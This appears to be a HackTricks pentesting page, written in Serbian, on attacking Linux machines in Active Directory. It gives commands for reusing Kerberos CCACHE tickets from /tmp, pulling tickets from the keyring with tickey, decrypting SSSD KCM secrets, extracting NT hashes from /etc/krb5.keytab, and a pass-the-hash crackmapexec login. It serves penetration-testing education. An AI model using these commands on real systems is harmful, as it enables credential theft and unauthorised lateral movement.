# Linux Active Directory

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Linux mašina takođe može biti prisutna unutar okruženja Active Directory.

Linux mašina u AD-u može **čuvati različite CCACHE tikete unutar fajlova. Ovi tiketi mogu biti korišćeni i zloupotrebljeni kao i bilo koji drugi kerberos tiket**. Da biste pročitali ove tikete, morate biti vlasnik tiketa ili **root** unutar mašine.

## Enumeracija

### Enumeracija AD-a sa linux-a

Ako imate pristup AD-u na linux-u (ili bash-u na Windows-u), možete pokušati [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) da biste enumerisali AD.

Takođe možete proveriti sledeću stranicu da biste saznali **druge načine enumeracije AD-a sa linux-a**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA je open-source **alternativa** za Microsoft Windows **Active Directory**, uglavnom za **Unix** okruženja. Kombinuje potpuni **LDAP direktorijum** sa MIT **Kerberos** Key Distribution Centrom za upravljanje slično kao Active Directory. Koristi Dogtag **Certificate System** za upravljanje CA & RA sertifikatima, podržava **multi-factor** autentifikaciju, uključujući pametne kartice. SSSD je integrisan za Unix autentifikacione procese. Saznajte više o tome u:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Igranje sa tiketima

### Pass The Ticket

Na ovoj stranici ćete pronaći različita mesta gde biste mogli **pronaći kerberos tikete unutar linux hosta**, na sledećoj stranici možete naučiti kako pretvoriti ove CCache tikete u Kirbi format (format koji je potreban za Windows) i takođe kako izvesti PTT napad:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### CCACHE tiket ponovna upotreba iz /tmp

CCACHE fajlovi su binarni formati za **čuvanje Kerberos akreditiva** i obično se čuvaju sa 600 dozvolama u `/tmp`. Ovi fajlovi se mogu identifikovati po svom **formatu imena, `krb5cc_%{uid}`,** koji se odnosi na UID korisnika. Za verifikaciju autentifikacionog tiketa, **okružna promenljiva `KRB5CCNAME`** treba biti postavljena na putanju željenog fajla sa tiketom, omogućavajući njegovu ponovnu upotrebu.

Prikažite trenutni tiket koji se koristi za autentifikaciju sa `env | grep KRB5CCNAME`. Format je prenosiv i tiket se može **ponovno koristiti postavljanjem okružne promenljive** sa `export KRB5CCNAME=/tmp/ticket.ccache`. Format imena Kerberos tiketa je `krb5cc_%{uid}` gde je uid UID korisnika.

```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```

### Ponovna upotreba CCACHE karata iz keyringa

**Kerberos karte koje su pohranjene u memoriji procesa mogu se izvući**, posebno kada je onemogućena zaštita ptrace na mašini (`/proc/sys/kernel/yama/ptrace_scope`). Korisni alat za tu svrhu može se pronaći na [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), koji olakšava izvlačenje ubrizgavanjem u sesije i ispisivanjem karata u `/tmp`.

Da biste konfigurisali i koristili ovaj alat, sledite korake u nastavku:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Ovaj postupak će pokušati da ubaci u različite sesije, što ukazuje na uspeh čuvanjem izvučenih karata u `/tmp` sa konvencijom imenovanja `__krb_UID.ccache`.

### Ponovna upotreba CCACHE karte iz SSSD KCM

SSSD održava kopiju baze podataka na putanji `/var/lib/sss/secrets/secrets.ldb`. Odgovarajući ključ se čuva kao skrivena datoteka na putanji `/var/lib/sss/secrets/.secrets.mkey`. Podrazumevano, ključ je čitljiv samo ako imate **root** dozvole.

Pozivanje \*\*`SSSDKCMExtractor` \*\* sa parametrima --database i --key će analizirati bazu podataka i **dekriptovati tajne**.

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

**Kerberos bloba keširanog akreditiva može se pretvoriti u upotrebljiv Kerberos CCache** fajl koji se može proslediti Mimikatz/Rubeus alatima.

### Ponovna upotreba CCACHE tiketa iz keytab fajla

```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

### Izdvajanje naloga iz /etc/krb5.keytab

Ključevi servisnih naloga, koji su neophodni za servise koji rade sa privilegijama root-a, bezbedno se čuvaju u datotekama **`/etc/krb5.keytab`**. Ovi ključevi, slični lozinkama za servise, zahtevaju strogu poverljivost.

Za pregled sadržaja keytab datoteke, može se koristiti alatka **`klist`**. Ovaj alat prikazuje detalje ključeva, uključujući i **NT Hash** za autentifikaciju korisnika, posebno kada je tip ključa identifikovan kao 23.

```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```

Za Linux korisnike, **`KeyTabExtract`** nudi funkcionalnost za izvlačenje RC4 HMAC heša, koji se može iskoristiti za ponovnu upotrebu NTLM heša.

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Na macOS-u, **`bifrost`** služi kao alat za analizu keytab fajlova.

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Koristeći izvučene informacije o nalogu i hešu, moguće je uspostaviti konekcije sa serverima koristeći alate poput **`crackmapexec`**.

```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```

## Reference

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
